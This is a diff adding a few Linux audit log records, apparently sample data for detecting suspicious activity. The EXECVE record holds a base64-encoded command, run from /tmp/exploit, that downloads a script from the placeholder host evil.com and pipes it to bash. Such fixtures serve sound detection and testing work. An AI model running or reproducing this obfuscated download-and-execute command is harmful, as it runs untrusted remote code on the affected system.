@@ -1,0 +1,5 @@
+type=SYSCALL msg=audit(1642271500.567:4001): arch=c000003e syscall=59 success=yes exit=0 a0=7ffd99112233 a1=7ffd99112250 a2=7ffd99112260 a3=0 items=2 ppid=7890 pid=76543 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts4 ses=11 comm="bash" exe="/bin/bash" key=(null)
+type=EXECVE msg=audit(1642271500.567:4001): argc=3 a0="bash" a1="-c" a2="echo IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo | base64 -d | bash"
+type=CWD msg=audit(1642271500.567:4001): cwd="/tmp/exploit"
+type=PATH msg=audit(1642271500.567:4001): item=0 name="/bin/bash" inode=345678 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0
+type=PROCTITLE msg=audit(1642271500.567:4001): proctitle=626173680062617365
